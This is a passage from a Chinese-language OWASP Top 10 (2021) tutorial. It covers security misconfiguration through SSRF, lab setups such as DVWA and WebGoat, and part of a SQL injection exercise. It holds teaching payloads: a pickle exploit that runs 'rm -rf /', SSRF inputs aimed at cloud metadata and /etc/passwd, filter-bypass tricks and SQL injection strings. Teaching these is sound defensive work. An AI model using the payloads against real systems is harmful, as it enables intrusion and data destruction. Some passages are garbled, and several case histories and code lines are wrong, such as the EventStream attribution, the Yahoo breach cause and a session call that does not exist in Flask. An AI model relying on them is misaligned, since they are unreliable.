    ↓         ↓       ↓      ↓       ↓       ↓
安全需求   威胁建模  代码审计  渗透测试  安全配置  补丁管理
```

✅ **使用安全框架和库**
- 不要自己实现加密算法
- 使用成熟的认证库（如OAuth 2.0、OpenID Connect）
- 使用Web应用防火墙（WAF）

✅ **限制资源消耗**
```python
# 限制文件上传大小
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB

# 限制请求频率
from flask_limiter import Limiter
limiter = Limiter(app, key_func=get_remote_address)
@app.route('/api/login')
@limiter.limit('5 per minute')  # 每分钟最多5次请求
def login():
    pass
```

#### 真实案例

**1. British Airways（2018）**
- **漏洞**：不安全的支付流程设计
- **影响**：38万信用卡数据泄露
- **原因**：支付页面加载了恶意JavaScript（Magecart攻击），设计未考虑第三方脚本的风险

**2. Facebook（2019）**
- **漏洞**：不安全的密码恢复设计
- **影响**：5000万账户被接管
- **原因**：`View As`功能的会话管理缺陷

---

### A05:2021 – Security Misconfiguration（安全配置错误）⭐␐⭐⭐

#### 漏洞描述

**安全配置错误**从2017版的第6名上升到第5名。这个类别关注**应用程序基础设施的错误配置**。

**核心问题**：应用程序、框架、服务器或平台的配置不当，导致安全问题。

#### 常见配置错误

**1. 默认凭证未更改**

```
常见默认凭证：
- admin:admin
- admin:password
- root:root
- tomcat:tomcat
- postgres:postgres
```

**攻击场景**：
```
1. 攻击者访问 http://target.com/manager/html
2. 弹出登录框
3. 尝试默认凭证（tomcat:tomcat）
4. 登录成功，部署恶意WAR包
5. 获取Webshell
```

**2. 不必要的功能未禁用**

**攻击场景**（HTTP方法未限制）：
```
# 允许OPTIONS方法（泄露敏感信息）
OPTIONS / HTTP/1.1
↓
HTTP/1.1 200 OK
Allow: GET, POST, PUT, DELETE, OPTIONS, TRACE

# 允许TRACE方法（XST攻击）
TRACE / HTTP/1.1
↓
HTTP/1.1 200 OK
...（返回请求内容，可用于窃取Cookie）
```

**3. 错误信息泄露**

**攻击场景**：
```python
# 错误的做法（显示详细错误）
@app.errorhandler(500)
def internal_error(error):
    return str(error), 500  # 显示堆栈跟踪

# 攻击者从错误信息获取：
# - 数据库类型（MySQL/PostgreSQL）
# - 表名和列名（用于SQL注入）
# - 文件路径（用于路径遍历）
# - 框架版本（用于已知漏洞）
```

**4. 目录列表未禁用**

**攻击场景**：
```
访问 http://target.com/uploads/
↓
Index of /uploads/
[DIR] ../ 
[FILE] shell.php 
[FILE] config.bak
[FILE] database.sql
↓
攻击者下载敏感文件
```

**5. 不必要的端口开放**

**攻击场景**：
```
1. 扫描目标（nmap -p- target.com）
2. 发现开放端口：22(SSH)、3306(MySQL)、6379(Redis)
3. 尝试爆破SSH密码
4. 尝试访问未授权的MySQL/Redis
```

**6. 过时的TLS配置**

**攻击场景**：
```
1. 检查目标TLS配置（testssl.sh target.com）
2. 发现支持SSLv3（POODLE攻击）
3. 发现支持弱加密套件（RC4、DES）
4. 实施中间人攻击
```

#### 防御措施

✅ **更改默认凭证**
```bash
# MySQL
ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongPassword123!';

# PostgreSQL
ALTER USER postgres WITH PASSWORD 'StrongPassword123!';

# Redis（禁用危险命令）
rename-command FLUSHALL ""
rename-command CONFIG ""
```

✅ **禁用不必要的功能**
```apache
# Apache（禁用目录列表和HTTP方法）
<Directory /var/www/html>
    Options -Indexes
    AllowOverride None
    Require all granted
</Directory>

<LimitExcept GET POST>
    Deny from all
</LimitExcept>
```

✅ **配置自定义错误页面**
```python
# Flask
@app.errorhandler(404)
def not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(error):
    return render_template('500.html'), 500
```

✅ **实施安全HTTP头**
```python
# Flask-Talisman
from flask_talisman import Talisman
Talisman(app)

# 或手动设置
@app.after_request
def set_security_headers(response):
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    return response
```

✅ **最小化攻击面**
```bash
# 关闭不必要的端口
sudo ufw deny 21/tcp   # FTP
sudo ufw deny 23/tcp   # Telnet
sudo ufw deny 3389/tcp # RDP（如果从外网访问）

# 仅允许必要IP访问数据库
sudo iptables -A INPUT -p tcp --dport 3306 -s 192.168.1.100 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 3306 -j DROP
```

✅ **使用自动化配置管理**
```yaml
# Ansible示例
- name: Secure Nginx configuration
  hosts: webservers
  tasks:
    - name: Disable server tokens
      lineinfile:
        path: /etc/nginx/nginx.conf
        regexp: '^server_tokens'
        line: 'server_tokens off;'
    
    - name: Enable TLS 1.2 only
      lineinfile:
        path: /etc/nginx/nginx.conf
        regexp: '^ssl_protocols'
        line: 'ssl_protocols TLSv1.2 TLSv1.3;'
```

✅ **定期安全审计**
```bash
# 使用Lynis进行系统安全审计
sudo apt install lynis
sudo lynis audit system

# 使用Nikto扫描Web服务器配置
nikto -h http://target.com

# 使用SSL Labs测试TLS配置
# 访问 https://www.ssllabs.com/ssltest/
```

#### 真实案例

**1. MongoDB Apocalypse（2017）**
- **漏洞**：默认配置允许无密码访问
- **影响**：超过10万个数据库被勒索
- **原因**：管理员未更改默认配置

**2. Equifax（2017）**
- **漏洞**：未及时禁用不必要的服务
- **影响**：1.43亿用户数据泄露
- **原因**：Apache Struts框架未更新，且WAF规则未正确配置

---

### A06:2021 – Vulnerable and Outdated Components（易受攻击组件）⭐⭐⭐⭐

#### 漏洞描述

**易受攻击组件**从2017版的第9名跃升到第6名。这个类别关注**应用程序依赖的组件（库、框架、模块）存在已知漏洞**。

**核心问题**：应用程序使用了含有已知漏洞的组件，且未及时更新。

#### 攻击场景

**场景1：使用含有已知漏洞的框架**

```
目标使用WordPress 4.7（含REST API漏洞CVE-2017-5487）
攻击者访问：
GET /wp-json/wp/v2/users
↓
返回所有用户的用户名（用于暴力破解密码）
```

**场景2：使用含有已知漏洞的库**

```python
# 使用含有已知漏洞的库
requirements.txt:
flask==0.12  # 含漏洞CVE-2018-1000656
requests==2.19.0  # 含漏洞CVE-2018-18074
```

**场景3：依赖混淆攻击（Dependency Confusion）**

```
1. 公司内部使用私有PyPI仓库
2. 攻击者在内网PyPI仓库注册同名包（但版本更高）
3. 构建系统时优先从内网仓库下载（含恶意代码）
```

#### 技术细节

**1. 组件漏洞的来源**

- **NVD (National Vulnerability Database)**：美国政府维护的漏洞数据库
- **CVE (Common Vulnerabilities and Exposures)**：通用漏洞披露编号
- **GitHub Advisory Database**：GitHub维护的开源漏洞数据库

**2. 漏洞评级**

- **CVSS (Common Vulnerability Scoring System)**：
  - 0.0-3.9：低（Low）
  - 4.0-6.9：中（Medium）
  - 7.0-8.9：高（High）
  - 9.0-10.0：严重（Critical）

**3. 依赖树**

现代应用程序依赖众多组件，形成复杂的依赖树。

```bash
# 查看Python依赖树
pipdeptree

# 示例输出
flask==2.0.1
  - Werkzeug [required: >=2.0, installed: 2.0.1]
    - markupsafe [required: >=2.0, installed: 2.0.1]
  - Jinja2 [required: >=3.0, installed: 3.0.1]
    - markupsafe [required: >=2.0, installed: 2.0.1]
```

#### 防御措施

✅ **使用依赖检查工具**
```bash
# Python（pip-audit）
pip install pip-audit
pip-audit

# Node.js（npm audit）
npm audit

# Java（OWASP Dependency-Check）
dependency-check.sh --project "MyApp" --scan ./target

# Docker（Trivy）
trivy image myapp:latest
```

✅ **实施补丁管理流程**
```
1. 监控漏洞情报（订阅NVD、CVE邮件列表）
2. 评估漏洞影响（CVSS评分、是否可被利用）
3. 测试补丁（在测试环境验证）
4. 部署补丁（滚动更新、蓝绿部署）
5. 验证修复（重新扫描）
```

✅ **使用软件成分分析（SCA）**
- **商业工具**：Snyk、WhiteSource、Black Duck
- **开源工具**：OWASP Dependency-Check、Retire.js

✅ **最小化依赖**
```python
# 错误的做法（导入整个库）
from sklearn import *  # 导入大量不需要的代码

# 正确的做法（仅导入需要的模块）
from sklearn.linear_model import LogisticRegression
```

✅ **锁定依赖版本**
```txt
# requirements.txt（锁定版本）
flask==2.0.1
requests==2.26.0
numpy==1.21.2

# 或使用hash校验
flask==2.0.1 \
    --hash=sha256:...
```

✅ **使用私有仓库和镜像**
```bash
# Python（使用私有PyPI）
pip install --index-url https://private-pypi.company.com/simple/ mypackage

# Node.js（使用私有npm）
npm config set registry https://npm.company.com/
```

#### 真实案例

**1. Equifax（2017）**
- **漏洞**：Apache Struts（CVE-2017-5638）
- **影响**：1.43亿用户数据泄露
- **原因**：未及时更新框架版本

**2. EventStream（2018）**
- **漏洞**：Node.js库event-stream被植入恶意代码
- **影响**：比特币钱包被盗
- **原因**：依赖混淆攻击

**3. SolarWinds（2020）**
- **漏洞**：Orion平台被植入后门
- **影响**：多个美国政府机构被入侵
- **原因**：构建系统被入侵，恶意代码被注入到合法更新中

---

### A07:2021 – Identification and Authentication Failures（身份认证失效）⭐⭐⭐

#### 漏洞描述

**身份认证失效**（2017版称为"认证和授权失败"）从第2名下降到第7名。这个类别关注**认证和会话管理的缺陷**。

**核心问题**：应用程序未正确验证用户身份，或会话管理不当。

#### 攻击场景

**场景1：弱密码策略**

```
允许用户设置弱密码：
- 123456
- password
- admin
- qwerty
```

**场景2：凭据爆破**

```
攻击者使用字典攻击：
POST /login
{
  "username": "admin",
  "password": "password123"
}
↓
返回"Invalid password"（确认用户名存在）

继续尝试其他密码：
password1, password2, ...
```

**场景3：会话固定（Session Fixation）**

```
1. 攻击者访问 http://target.com/login，获取会话ID（PHPSESSID=abc123）
2. 攻击者诱导受害者访问 http://target.com/login?PHPSESSID=abc123
3. 受害者登录
4. 攻击者使用会话ID（PHPSESSID=abc123）访问账户
```

**场景4：会话劫持**

```
1. 攻击者嗅探网络流量（公共WiFi）
2. 捕获受害者的会话Cookie
3. 攻击者使用捕获的Cookie访问账户（会话劫持）
```

**场景5：不安全的密码恢复**

```
1. 用户点击"忘记密码"
2. 系统询问"你出生的城市是？"（安全问题）
3. 攻击者从社交媒体获取答案（如Facebook"出生地：北京"）
4. 攻击者重置密码
```

#### 防御措施

✅ **实施强密码策略**
```python
import re

def validate_password(password):
    # 至少8个字符
    if len(password) < 8:
        return False, "Password must be at least 8 characters"
    
    # 至少包含一个大写字母
    if not re.search(r'[A-Z]', password):
        return False, "Password must contain uppercase letter"
    
    # 至少包含一个小写字母
    if not re.search(r'[a-z]', password):
        return False, "Password must contain lowercase letter"
    
    # 至少包含一个数字
    if not re.search(r'[0-9]', password):
        return False, "Password must contain number"
    
    # 至少包含一个特殊字符
    if not re.search(r'[!@#$%^&*]', password):
        return False, "Password must contain special character"
    
    return True, "Password is strong"
```

✅ **实施多因素认证（MFA）**
```python
# 使用PyOTP（TOTP）
import pyotp

# 生成密钥
secret = pyotp.random_base32()
totp = pyotp.TOTP(secret)

# 验证OTP
user_otp = request.form['otp']
if totp.verify(user_otp):
    login_success()
else:
    login_fail()
```

✅ **实施账户锁定**
```python
# 跟踪失败尝试
failed_attempts = {}

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # 检查是否锁定
    if username in failed_attempts and failed_attempts[username]['count'] >= 5:
        if time.time() - failed_attempts[username]['last_attempt'] < 900:  # 15分钟
            return "Account locked. Try again later.", 403
        else:
            # 重置计数
            failed_attempts[username]['count'] = 0
    
    if not authenticate(username, password):
        # 记录失败尝试
        if username not in failed_attempts:
            failed_attempts[username] = {'count': 0, 'last_attempt': 0}
        failed_attempts[username]['count'] += 1
        failed_attempts[username]['last_attempt'] = time.time()
        return "Invalid credentials", 401
    
    # 登录成功，重置计数
    if username in failed_attempts:
        del failed_attempts[username]
    
    return "Login success", 200
```

✅ **安全会话管理**
```python
# Flask示例
app.config['SESSION_COOKIE_HTTPONLY'] = True  # 防止XSS读取Cookie
app.config['SESSION_COOKIE_SECURE'] = True    # 仅HTTPS传输
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax' # 防止CSRF
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)  # 会话超时

@app.route('/login')
def login():
    session.regenerate()  # 登录后生成新的会话ID（防止会话固定）
    session['user_id'] = user.id
    return "Logged in"

@app.route('/logout')
def logout():
    session.destroy()  # 销毁会话
    return "Logged out"
```

✅ **使用安全的密码恢复机制**
```python
import secrets

@app.route('/forgot-password', methods=['POST'])
def forgot_password():
    email = request.form['email']
    user = User.query.filter_by(email=email).first()
    
    if user:
        # 生成重置令牌（一次性）
        token = secrets.token_urlsafe(32)
        user.reset_token = token
        user.reset_token_expiry = datetime.utcnow() + timedelta(minutes=15)  # 15分钟有效期
        db.session.commit()
        
        # 发送重置邮件
        send_reset_email(user.email, token)
    
    # 即使用户不存在也返回相同消息（防止用户枚举）
    return "If your email is registered, you will receive a password reset link."
```

✅ **实施CAPTCHA**
```python
# 使用Flask-WTF的Recaptcha
from flask_wtf.recaptcha import RecaptchaField

class LoginForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired()])
    password = PasswordField('Password', validators=[DataRequired()])
    recaptcha = RecaptchaField()  # Google reCAPTCHA
```

#### 真实案例

**1. LinkedIn（2012）**
- **漏洞**：弱密码哈希（SHA1无盐）
- **影响**：1.67亿账户泄露
- **原因**：未使用自适应哈希函数

**2. Yahoo（2013）**
- **漏洞**：弱密码策略、未实施MFA
- **影响**：30亿账户泄露
- **原因**：攻击者可以暴力破解密码

**3. Facebook（2019）**
- **漏洞**："View As"功能的会话管理缺陷
- **影响**：5000万账户被接管
- **原因**：会话令牌泄露

---

### A08:2021 – Software and Data Integrity Failures（软件和数据完整性故障）⭐⭐⭐

#### 漏洞描述

**软件和数据完整性故障**是2021版**新引入的类别**，关注**软件更新、关键数据和CI/CD管道的完整性验证失败**。

**核心问题**：应用程序未验证软件更新、敏感数据或CI/CD管道的完整性，导致恶意代码被注入。

#### 攻击场景

**场景1：不安全的反序列化（Insecure Deserialization）**

```python
# 错误的做法（使用pickle反序列化不可信数据）
import pickle

data = request.cookies.get('user_data')
user_data = pickle.loads(base64.b64decode(data))  # 危险！

# 攻击者构造恶意payload：
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('rm -rf /',))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
# 发送给服务器，服务器反序列化时执行任意命令
```

**场景2：CI/CD管道污染**

```
1. 攻击者入侵CI/CD系统（如Jenkins）
2. 修改构建脚本（注入恶意代码）
3. 构建系统将恶意代码打包到合法更新中
4. 用户下载更新，系统被入侵
```

**场景3：自动更新未验证签名**

```
1. 应用程序自动下载更新（http://example.com/update.zip）
2. 未验证数字签名
3. 中间人攻击（MITM）替换更新包
4. 用户安装恶意更新
```

**场景4：依赖库被劫持**

```
1. 攻击者入侵PyPI/npm（或注册相似名称的包）
2. 上传恶意库（如"flask-security"而不是"flask-security-nd"）
3. 用户安装恶意库
4. 恶意代码被执行
```

#### 防御措施

✅ **避免不安全的反序列化**
```python
# 错误的做法（使用pickle）
data = pickle.loads(untrusted_data)

# 正确的做法（使用JSON）
import json
data = json.loads(untrusted_data)  # JSON仅支持基本类型，无法执行代码
```

✅ **验证数字签名**
```python
import gnupg

# 验证更新包签名
gpg = gnupg.GPG()
with open('update.tar.gz.sig', 'rb') as sig_file:
    with open('update.tar.gz', 'rb') as data_file:
        verified = gpg.verify_file(sig_file, data_file)
        if not verified:
            raise Exception("Signature verification failed")
```

✅ **实施CI/CD安全控制**
```yaml
# GitLab CI示例
stages:
  - build
  - test
  - security_scan
  - deploy

build:
  stage: build
  script:
    - docker build -t myapp:${CI_COMMIT_SHA} .
  only:
    - main

security_scan:
  stage: security_scan
  script:
    - trivy image myapp:${CI_COMMIT_SHA}
    - pip-audit
  only:
    - main

deploy:
  stage: deploy
  script:
    - kubectl apply -f deployment.yaml
  only:
    - main
  when: manual  # 需要人工审批
```

✅ **使用依赖锁定和哈希校验**
```txt
# requirements.txt（含hash）
flask==2.0.1 \
    --hash=sha256:ce270e5aa0f311b150fd17a3c87f629e32ebeb6e610e8a64e4e4c8dc5978965c
    --hash=sha256:1e5cc6fa3d4c12cc6c33d4c5c0866c7b8e8b6d547d7c3a9269e7b89b0fde2d6
```

✅ **实施代码签名**
```bash
# 签名Python包
gpg --detach-sign --armor dist/mypackage-1.0.0.tar.gz

# 验证签名
gpg --verify dist/mypackage-1.0.0.tar.gz.asc
```

✅ **监控依赖库异常**
```python
# 使用Snyk监控依赖库
snyk monitor

# 或使用GitHub Dependabot
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "daily"
```

#### 真实案例

**1. SolarWinds（2020）**
- **漏洞**：CI/CD管道被入侵
- **影响**：多个美国政府机构被入侵
- **原因**：构建系统被植入后门

**2. Codecov（2021）**
- **漏洞**：CI/CD脚本被篡改
- **影响**：数千家公司源代码泄露
- **原因**：攻击者修改了bash上传脚本

**3. EventStream（2018）**
- **漏洞**：依赖库被劫持
- **影响**：比特币钱包被盗
- **原因**：攻击者注册了相似名称的包并植入恶意代码

---

### A09:2021 – Security Logging and Monitoring Failures（安全日志和监控故障）⭐⭐⭐

#### 漏洞描述

**安全日志和监控故障**（2017版称为"记录和监控不足"）从第10名上升到第9名。这个类别关注**日志记录和监控的不足**。

**核心问题**：应用程序未记录安全事件，或未有效监控可疑活动，导致无法及时发现和响应攻击。

#### 攻击场景

**场景1：未记录登录失败**

```
攻击者暴力破解密码：
POST /login {"username": "admin", "password": "password1"}
POST /login {"username": "admin", "password": "password2"}
POST /login {"username": "admin", "password": "password3"}
...

服务器未记录失败尝试
↓
无法检测暴力破解攻击
```

**场景2：日志记录敏感信息**

```python
# 错误的做法
logging.info(f'User login: username={username}, password={password}')
# 密码被记录到日志文件中
# 攻击者窃取日志文件获取密码
```

**场景3：未监控异常活动**

```
1. 攻击者使用窃取的凭据登录
2. 从异常地理位置访问（如国外IP）
3. 下载大量数据
4. 服务器未触发警报
5. 攻击未被发现（平均发现时间：287天）
```

#### 防御措施

✅ **记录关键安全事件**
```python
import logging

# 配置日志
logging.basicConfig(
    filename='/var/log/myapp/security.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# 记录登录成功
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    if authenticate(username, request.form['password']):
        logging.info(f'Login success: username={username}, ip={request.remote_addr}')
        return "Logged in", 200
    else:
        logging.warning(f'Login failed: username={username}, ip={request.remote_addr}')
        return "Invalid credentials", 401
```

✅ **使用集中式日志管理**
```yaml
# ELK Stack（Elasticsearch + Logstash + Kibana）
# Logstash配置
input {
  file {
    path => "/var/log/myapp/security.log"
    start_position => "beginning"
  }
}

filter {
  grok {
    match => { "message" => "%{TIMESTAMP_ISO8601:timestamp} - %{LOGLEVEL:level} - %{GREEDYDATA:message}" }
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "security-logs-%{+YYYY.MM.dd}"
  }
}
```

✅ **实施实时告警**
```python
# 使用Slack Webhook发送告警
import requests

def send_alert(message):
    webhook_url = "https://hooks.slack.com/services/xxx/yyy/zzz"
    payload = {"text": message}
    requests.post(webhook_url, json=payload)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    if not authenticate(username, request.form['password']):
        # 记录失败尝试
        failed_attempts[username] = failed_attempts.get(username, 0) + 1
        
        # 如果失败次数超过阈值，发送告警
        if failed_attempts[username] >= 5:
            send_alert(f"⚠️ Brute force attack detected: username={username}")
        
        return "Invalid credentials", 401
    return "Logged in", 200
```

✅ **避免记录敏感信息**
```python
# 错误的做法
logging.info(f'User login: password={password}')

# 正确的做法
logging.info(f'User login: username={username}')  # 不记录密码

# 对敏感信息进行脱敏
def mask_sensitive_data(data):
    if len(data) <= 4:
        return '*' * len(data)
    return data[:2] + '*' * (len(data) - 4) + data[-2:]

logging.info(f'Credit card: {mask_sensitive_data("1234-5678-9012-3456")}')
# 输出：Credit card: 12**********3456
```

✅ **实施日志轮转**
```bash
# Linux logrotate配置
# /etc/logrotate.d/myapp
/var/log/myapp/*.log {
    daily
    rotate 30  # 保留30天
    compress   # 压缩旧日志
    delaycompress
    missingok
    notifempty
    create 0640 www-data adm
    sharedscripts
    postrotate
        systemctl reload myapp
    endscript
}
```

✅ **使用SIEM（安全信息和事件管理）**
- **商业工具**：Splunk、QRadar、ArcSight
- **开源工具**：ELK Stack、Wazuh、OSSEC

#### 真实案例

**1. Target（2013）**
- **漏洞**：未有效监控异常活动
- **影响**：4000万信用卡数据泄露
- **原因**：攻击者使用窃取的凭据访问系统，但未触发告警

**2. Equifax（2012017）**
- **漏洞**：未监控安全更新
- **影响**：1.43亿用户数据泄露
- **原因**：安全团队未收到Apache Struts需要更新的通知

---

### A10:2021 – Server-Side Request Forgery (SSRF)⭐⭐⭐

#### 漏洞描述

**SSRF（Server-Side Request Forgery，服务端请求伪造）** 是2021版**新进入Top 10的类别**。这个类别关注**应用程序未验证用户提供的URL，导致攻击者可以迫使服务器发起恶意请求**。

**核心问题**：攻击者可以迫使服务器向内部服务、云元数据服务或第三方系统发起请求，从而绕过防火墙或访问内部资源。

#### 攻击场景

**场景1：访问云元数据服务**

```
1. 应用程序功能：用户输入URL，服务器抓取内容
2. 攻击者输入：http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. 服务器访问AWS元数据服务
4. 返回临时凭证
5. 攻击者使用凭证访问AWS资源
```

**场景2：端口扫描内网**

```
1. 应用程序功能：用户输入URL，服务器检查是否在线
2. 攻击者输入：http://192.168.1.1:22
3. 服务器访问内网SSH服务
4. 根据响应时间判断端口是否开放
5. 攻击者映射内网拓扑
```

**场景3：绕过防火墙**

```
1. 防火墙规则：禁止外网访问数据库（3306端口）
2. 应用程序功能：用户输入URL，服务器下载文件
3. 攻击者输入：http://database.internal:3306
4. 服务器（在内网）可以访问数据库
5. 攻击者通过应用程序访问内网资源
```

**场景4：文件协议滥用**

```
1. 应用程序功能：用户输入URL，服务器读取文件
2. 攻击者输入：file:///etc/passwd
3. 服务器读取本地文件
4. 返回文件内容
```

#### 技术细节

**1. 常见危险函数**

```php
// PHP
file_get_contents($url)
curl_exec($ch)
fopen($url)

// Python
requests.get($url)
urllib.request.urlopen($url)

// Java
HttpURLConnection
OkHttp

// Node.js
axios.get($url)
http.get($url)
```

**2. 绕过过滤的技巧**

```
# 使用IPv6
http://[::1]/  # 指向本地

# 使用十进制IP
http://3232235521/  # 192.168.1.1的十进制表示

# 使用URL编码
http://%31%39%32%2e%31%36%38%2e%31%2e%31/  # 192.168.1.1

# 使用DNS重绑定
攻击者控制DNS服务器，首先解析到合法域名，然后解析到内网IP

# 使用重定向
http://attacker.com/redirect.php  # 首先返回200，然后302重定向到内网
```

#### 防御措施

✅ **实施URL白名单**
```python
import re

ALLOWED_DOMAINS = ['api.trusted-service.com', 'cdn.example.com']

def is_url_allowed(url):
    parsed = urlparse(url)
    return parsed.netloc in ALLOWED_DOMAINS

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    if not is_url_allowed(url):
        return "URL not allowed", 403
    # ...
```

✅ **禁用危险协议**
```python
from urllib.parse import urlparse

def is_url_safe(url):
    parsed = urlparse(url)
    # 仅允许HTTP和HTTPS
    if parsed.scheme not in ['http', 'https']:
        return False
    # 禁止访问内网IP
    if is_private_ip(parsed.hostname):
        return False
    return True

def is_private_ip(hostname):
    import ipaddress
    try:
        ip = ipaddress.ip_address(hostname)
        return ip.is_private
    except ValueError:
        # 域名，解析后检查
        import socket
        ip = socket.gethostbyname(hostname)
        return ipaddress.ip_address(ip).is_private
```

✅ **使用独立代理**
```python
# 将外部请求通过代理发送（隔离内网）
import requests

proxies = {
    'http': 'http://proxy.example.com:8080',
    'https': 'http://proxy.example.com:8080'
}

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    response = requests.get(url, proxies=proxies)
    return response.text
```

✅ **实施网络分段**
```bash
# 数据库仅允许应用服务器访问
sudo iptables -A INPUT -p tcp --dport 3306 -s 192.168.1.100 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 3306 -j DROP

# AWS：使用安全组限制访问
# 数据库安全组：仅允许应用服务器安全组访问
```

✅ **禁用URL重定向跟随**
```python
import requests

# 错误的做法（跟随重定向）
response = requests.get(url, allow_redirects=True)

# 正确的做法（不跟随重定向）
response = requests.get(url, allow_redirects=False)
if response.status_code in [301, 302, 303, 307, 308]:
    return "Redirect not allowed", 403
```

✅ **使用内容安全策略（CSP）**
```http
Content-Security-Policy: default-src 'self'; connect-src 'self' https://api.trusted-service.com
```

#### 真实案例

**1. Capital One（2019）**
- **漏洞**：SSRF
- **影响**：1亿信用卡申请数据泄露
- **原因**：攻击者利用SSRF访问AWS元数据服务，获取临时凭证

**2. Facebook（2018）**
- **漏洞**：SSRF
- **影响**：4000万用户数据泄露
- **原因**：攻击者通过SSRF访问内部API

**3. Google（2019）**
- **漏洞**：SSRF in Google Cloud Metadata Service
- **影响**：攻击者可以访问GCP元数据
- **原因**：元数据服务未验证请求来源

---

## 🛠️ 实验环境

### 推荐实验平台

#### 1. DVWA（Damn Vulnerable Web Application）

**简介**：一个故意设计有漏洞的PHP/MySQL应用，适合初学者。

**安装方法**：
```bash
# 使用Docker安装（推荐）
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# 或手动安装
# 1. 下载DVWA
git clone https://github.com/digininja/DVWA.git
cd DVWA

# 2. 配置数据库
mysql -u root -p
CREATE DATABASE dvwa;
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';
FLUSH PRIVILEGES;

# 3. 配置config.inc.php
cp config/config.inc.php.dist config/config.inc.php

# 4. 启动Apache
sudo systemctl start apache2
```

**访问**：http://localhost/login.php
- 默认凭证：admin/password

**难度级别**：
- **Low**：无防护措施
- **Medium**：部分防护（可被绕过）
- **High**：强防护（需要高级技术）
- **Impossible**：安全实现（参考修复方案）

**包含漏洞**：
- SQL注入
- XSS（反射型、存储型）
- CSRF
- 文件包含
- 文件上传
- 命令注入
- Brute Force

#### 2. WebGoat

**简介**：OWASP官方漏洞教学应用，覆盖OWASP Top 10。

**安装方法**：
```bash
# 使用Docker安装
docker run -d -p 8080:8080 webgoat/goatandwolf

# 或下载JAR文件
wget https://github.com/WebGoat/WebGoat/releases/download/v2023.4/WebGoat-2023.4.jar
java -jar WebGoat-2023.4.jar
```

**访问**：http://localhost:8080/WebGoat

**特点**：
- 交互式课程（每个漏洞有详细讲解）
- 逐步引导（从原理到利用）
- 包含练习题

**包含漏洞**：
- SQL注入
- XSS
- CSRF
- 不安全的反序列化
- XXE
- SSRF
- 密码存储
- 会话管理

#### 3. Pikachu

**简介**：中文漏洞教学平台，适合中国用户。

**安装方法**：
```bash
# 使用Docker安装
docker run -d -p 80:80 area39/pikachu

# 或手动安装
# 1. 下载Pikachu
git clone https://github.com/zhuifengshaonianhanlu/pikachu.git

# 2. 配置数据库
mysql -u root -p < pikachu/install/create_database.php

# 3. 部署到Web服务器
sudo cp -r pikachu /var/www/html/
```

**访问**：http://localhost/pikachu

**特点**：
- 全中文界面
- 覆盖常见漏洞
- 适合初学者

**包含漏洞**：
- SQL注入
- XSS
- CSRF
- 文件包含
- 文件上传
- 命令注入
- 越权访问
- SSRF

#### 4. bWAPP（Buggy Web Application）

**简介**：包含超过100个漏洞的应用。

**安装方法**：
```bash
# 使用Docker安装
docker run -d -p 80:80 raesene/bwapp

# 访问 http://localhost/install.php 初始化
```

**访问**：http://localhost

**特点**：
- 漏洞数量多
- 支持多种数据库（MySQL、PostgreSQL）
- 可调整难度

#### 5. Metasploitable 2/3

**简介**：故意设计有漏洞的Linux虚拟机，包含Web应用漏洞。

**安装方法**：
```bash
# 下载Metasploitable 2
wget https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

# 在VMware/VirtualBox中导入
```

**访问**：https://<metasploitable-ip>/

**包含服务**：
- Apache（含多个漏洞应用）
- MySQL（弱密码）
- PostgreSQL
- Tomcat（默认凭证）
- Twiki（多个漏洞）

### 实验环境搭建建议

**1. 使用虚拟化技术**
- **VirtualBox/VMware**：运行完整的虚拟机
- **Docker**：快速部署容器化应用
- **Vagrant**：自动化虚拟机配置

**2. 网络隔离**
```bash
# 创建隔离的虚拟网络（防止攻击外网）
# VirtualBox：仅主机网络（Host-only Network）
# VMware：虚拟网络编辑器 → 仅主机模式
```

**3. 快照管理**
- 在开始实验前创建快照
- 每次实验后恢复快照（保持环境干净）

**4. 工具准备**
```bash
# 安装Kali Linux（渗透测试发行版）
# 包含工具：
# - Burp Suite（Web代理）
# - OWASP ZAP（漏洞扫描）
# - SQLmap（SQL注入自动化）
# - Nmap（端口扫描）
# - Nikto（Web服务器审计）
```

---

## 📝 实验步骤

### 实验1：SQL注入实战（DVWA）

#### 目标
- 理解SQL注入原理
- 掌握手工注入技巧
- 学习使用SQLmap自动化工具

#### 步骤

**1. 信息收集**
```
1. 访问DVWA（http://localhost/login.php）
2. 登录（admin/password）
3. 设置难度为"Low"
4. 进入"SQL Injection"模块
```

**2. 手工注入**
```
# 测试注入点
输入：1
返回：User ID: 1
Name: admin
Surname: admin
```

**3. 确定列数**
```
输入：1' ORDER BY 1 -- 
返回：正常

输入：1' ORDER BY 2 -- 
返回：正常

输入：1' ORDER BY 3 -- 
返回：Unknown column '3' in 'order clause'
结论：查询返回2列
```

**4. 使用UNION SELECT提取数据**
```
输入：1' UNION SELECT user(), database() -- 
返回：
User ID: 1
Name: root@localhost
Surname: dvwa

结论：数据库用户是root，数据库名是dvwa
```

**5. 提取表名**
```
输入：1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=database() -- 
返回：
User ID: 1
Name: guestbook
Surname: dvwa

